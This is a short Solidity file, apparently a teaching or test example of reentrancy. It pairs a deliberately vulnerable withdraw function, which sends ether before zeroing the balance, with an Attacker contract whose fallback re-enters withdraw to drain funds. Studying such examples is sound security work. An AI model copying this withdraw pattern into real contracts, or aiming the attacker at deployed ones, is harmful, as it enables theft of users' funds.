pragma solidity 0.4.23;

import "./Balances.sol";


contract VulnerableBalances is Balances {
    function withdraw() public {
        if (msg.sender.call.value(balances[msg.sender])()) {
            balances[msg.sender] = 0;
        }
    }
}

contract Attacker {
    VulnerableBalances public vulnerable;

    constructor(VulnerableBalances _vulnerable) public payable {
        vulnerable = _vulnerable;

        vulnerable.deposit.value(address(this).balance)();
    }

    function () public payable {
        vulnerable.withdraw();
    }

    function start() public {
        vulnerable.withdraw();
    }
}
